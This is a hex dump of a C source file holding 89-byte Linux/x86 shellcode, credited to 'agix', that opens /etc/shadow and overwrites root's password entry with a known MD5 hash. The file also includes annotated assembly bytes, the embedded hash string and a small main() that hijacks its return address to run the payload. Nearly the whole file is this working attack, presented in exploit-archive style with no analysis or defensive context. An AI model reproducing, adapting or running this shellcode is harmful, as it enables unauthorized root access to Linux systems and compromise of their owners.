00000000  2f 2a 20 0a 20 7c 20 54  69 74 6c 65 3a 20 4c 69  |/* . | Title: Li|
00000010  6e 75 78 2f 78 38 36 20  70 77 72 69 74 65 28 22  |nux/x86 pwrite("|
00000020  2f 65 74 63 2f 73 68 61  64 6f 77 22 2c 20 68 61  |/etc/shadow", ha|
00000030  73 68 2c 20 33 32 2c 20  38 29 20 53 68 65 6c 6c  |sh, 32, 8) Shell|
00000040  63 6f 64 65 20 38 39 20  42 79 74 65 73 0a 20 7c  |code 89 Bytes. ||
00000050  20 44 65 73 63 72 69 70  74 69 6f 6e 3a 20 72 65  | Description: re|
00000060  70 6c 61 63 65 20 72 6f  6f 74 27 73 20 70 61 73  |place root's pas|
00000070  73 77 6f 72 64 20 77 69  74 68 20 68 61 73 68 20  |sword with hash |
00000080  6f 66 20 22 61 67 69 78  22 20 69 6e 20 4d 44 35  |of "agix" in MD5|
00000090  0a 20 7c 20 54 79 70 65  3a 20 53 68 65 6c 6c 63  |. | Type: Shellc|
000000a0  6f 64 65 0a 20 7c 20 41  75 74 68 6f 72 3a 20 61  |ode. | Author: a|
000000b0  67 69 78 0a 20 7c 20 50  6c 61 74 66 6f 72 6d 3a  |gix. | Platform:|
000000c0  20 4c 69 6e 75 78 20 58  38 36 0a 2a 2f 0a 0a 23  | Linux X86.*/..#|
000000d0  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
000000e0  3e 0a 0a 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |>..char shellcod|
000000f0  65 5b 5d 20 3d 0a 22 5c  78 33 31 5c 78 43 39 22  |e[] =."\x31\xC9"|
00000100  20 20 20 20 20 20 20 20  20 20 20 20 09 09 2f 2f  |            ..//|
00000110  78 6f 72 20 65 63 78 2c  65 63 78 0a 22 5c 78 35  |xor ecx,ecx."\x5|
00000120  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000130  09 09 2f 2f 70 75 73 68  20 65 63 78 0a 22 5c 78  |..//push ecx."\x|
00000140  36 38 5c 78 36 31 5c 78  36 34 5c 78 36 46 5c 78  |68\x61\x64\x6F\x|
00000150  37 37 22 20 20 20 09 2f  2f 70 75 73 68 20 64 77  |77"   .//push dw|
00000160  6f 72 64 20 30 78 37 37  36 66 36 34 36 31 0a 22  |ord 0x776f6461."|
00000170  5c 78 36 38 5c 78 36 33  5c 78 32 46 5c 78 37 33  |\x68\x63\x2F\x73|
00000180  5c 78 36 38 22 20 20 20  20 20 20 09 2f 2f 70 75  |\x68"      .//pu|
00000190  73 68 20 64 77 6f 72 64  20 30 78 36 38 37 33 32  |sh dword 0x68732|
000001a0  66 36 33 0a 22 5c 78 36  38 5c 78 32 46 5c 78 32  |f63."\x68\x2F\x2|
000001b0  46 5c 78 36 35 5c 78 37  34 22 20 09 09 2f 2f 70  |F\x65\x74" ..//p|
000001c0  75 73 68 20 64 77 6f 72  64 20 30 78 37 34 36 35  |ush dword 0x7465|
000001d0  32 66 32 66 0a 22 5c 78  38 39 5c 78 45 33 22 20  |2f2f."\x89\xE3" |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 2f  |              ./|
000001f0  2f 6d 6f 76 20 65 62 78  2c 65 73 70 0a 22 5c 78  |/mov ebx,esp."\x|
00000200  36 36 5c 78 42 39 5c 78  39 31 5c 78 30 31 22 20  |66\xB9\x91\x01" |
00000210  20 20 20 20 20 20 20 20  09 2f 2f 6d 6f 76 20 63  |        .//mov c|
00000220  78 2c 30 78 31 39 31 0a  22 5c 78 33 31 5c 78 43  |x,0x191."\x31\xC|
00000230  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000240  20 09 2f 2f 78 6f 72 20  65 61 78 2c 65 61 78 0a  | .//xor eax,eax.|
00000250  22 5c 78 42 30 5c 78 30  35 22 20 20 20 20 20 20  |"\xB0\x05"      |
00000260  20 20 20 20 20 20 20 20  20 09 2f 2f 6d 6f 76 20  |         .//mov |
00000270  61 6c 2c 30 78 35 0a 22  5c 78 43 44 5c 78 38 30  |al,0x5."\xCD\x80|
00000280  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000290  09 2f 2f 69 6e 74 20 30  78 38 30 0a 22 5c 78 38  |.//int 0x80."\x8|
000002a0  39 5c 78 43 33 22 20 20  20 20 20 20 20 20 20 20  |9\xC3"          |
000002b0  20 20 20 20 20 09 2f 2f  6d 6f 76 20 65 62 78 2c  |     .//mov ebx,|
000002c0  65 61 78 0a 22 5c 78 45  42 5c 78 31 32 22 20 09  |eax."\xEB\x12" .|
000002d0  09 09 2f 2f 6a 6d 70 20  73 68 6f 72 74 20 30 78  |..//jmp short 0x|
000002e0  33 34 0a 22 5c 78 35 39  22 20 09 09 09 09 2f 2f  |34."\x59" ....//|
000002f0  70 6f 70 20 65 63 78 0a  22 5c 78 33 31 5c 78 43  |pop ecx."\x31\xC|
00000300  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000310  20 09 2f 2f 78 6f 72 20  65 61 78 2c 65 61 78 0a  | .//xor eax,eax.|
00000320  22 5c 78 33 31 5c 78 44  32 22 20 20 20 20 20 20  |"\x31\xD2"      |
00000330  20 20 20 20 20 20 20 20  20 09 2f 2f 78 6f 72 20  |         .//xor |
00000340  65 64 78 2c 65 64 78 0a  22 5c 78 42 32 5c 78 32  |edx,edx."\xB2\x2|
00000350  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000360  20 09 2f 2f 6d 6f 76 20  64 6c 2c 30 78 32 30 0a  | .//mov dl,0x20.|
00000370  22 5c 78 42 30 5c 78 42  35 22 20 20 20 20 20 20  |"\xB0\xB5"      |
00000380  20 20 20 20 20 20 20 20  20 09 2f 2f 6d 6f 76 20  |         .//mov |
00000390  61 6c 2c 30 78 62 35 0a  22 5c 78 33 31 5c 78 46  |al,0xb5."\x31\xF|
000003a0  36 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6"              |
000003b0  20 09 2f 2f 78 6f 72 20  65 73 69 2c 65 73 69 0a  | .//xor esi,esi.|
000003c0  22 5c 78 36 41 5c 78 30  38 22 20 20 20 20 20 20  |"\x6A\x08"      |
000003d0  20 20 20 20 20 20 09 09  2f 2f 70 75 73 68 20 62  |      ..//push b|
000003e0  79 74 65 20 2b 30 78 38  0a 22 5c 78 35 45 22 20  |yte +0x8."\x5E" |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  09 09 2f 2f 70 6f 70 20  65 73 69 0a 22 5c 78 33  |..//pop esi."\x3|
00000410  31 5c 78 46 46 22 20 20  20 20 20 20 20 20 20 20  |1\xFF"          |
00000420  20 20 20 20 20 09 2f 2f  78 6f 72 20 65 64 69 2c  |     .//xor edi,|
00000430  65 64 69 0a 22 5c 78 43  44 5c 78 38 30 22 20 20  |edi."\xCD\x80"  |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
00000450  69 6e 74 20 30 78 38 30  0a 22 5c 78 45 38 5c 78  |int 0x80."\xE8\x|
00000460  45 39 5c 78 46 46 5c 78  46 46 5c 78 46 46 22 20  |E9\xFF\xFF\xFF" |
00000470  20 20 20 20 20 09 2f 2f  63 61 6c 6c 20 30 78 32  |     .//call 0x2|
00000480  32 0a 2f 2f 64 62 20 22  49 4d 4d 6b 6d 67 69 39  |2.//db "IMMkmgi9|
00000490  24 4e 75 68 50 73 31 42  38 48 35 75 7a 37 6b 45  |$NuhPs1B8H5uz7kE|
000004a0  4f 65 4b 66 32 48 31 3a  22 0a 22 5c 78 34 39 5c  |OeKf2H1:"."\x49\|
000004b0  78 34 44 5c 78 34 44 5c  78 36 42 5c 78 36 44 5c  |x4D\x4D\x6B\x6D\|
000004c0  78 36 37 5c 78 36 39 5c  78 33 39 22 0a 22 5c 78  |x67\x69\x39"."\x|
000004d0  32 34 5c 78 34 45 5c 78  37 35 5c 78 36 38 5c 78  |24\x4E\x75\x68\x|
000004e0  35 30 5c 78 37 33 5c 78  33 31 5c 78 34 32 22 0a  |50\x73\x31\x42".|
000004f0  22 5c 78 33 38 5c 78 34  38 5c 78 33 35 5c 78 37  |"\x38\x48\x35\x7|
00000500  35 5c 78 37 41 5c 78 33  37 5c 78 36 42 5c 78 34  |5\x7A\x37\x6B\x4|
00000510  35 22 0a 22 5c 78 34 46  5c 78 36 35 5c 78 34 42  |5"."\x4F\x65\x4B|
00000520  5c 78 36 36 5c 78 33 32  5c 78 34 38 5c 78 33 31  |\x66\x32\x48\x31|
00000530  5c 78 33 41 22 3b 0a 0a  69 6e 74 20 6d 61 69 6e  |\x3A";..int main|
00000540  28 69 6e 74 20 61 72 67  63 2c 20 63 68 61 72 20  |(int argc, char |
00000550  2a 2a 61 72 67 76 29 20  7b 0a 20 20 20 20 20 20  |**argv) {.      |
00000560  20 20 69 6e 74 20 2a 72  65 74 3b 0a 20 20 20 20  |  int *ret;.    |
00000570  20 20 20 20 72 65 74 20  3d 20 28 69 6e 74 20 2a  |    ret = (int *|
00000580  29 26 72 65 74 20 2b 20  32 3b 0a 20 20 20 20 20  |)&ret + 2;.     |
00000590  20 20 20 28 2a 72 65 74  29 20 3d 20 28 69 6e 74  |   (*ret) = (int|
000005a0  29 20 73 68 65 6c 6c 63  6f 64 65 3b 0a 7d        |) shellcode;.}|
000005ae
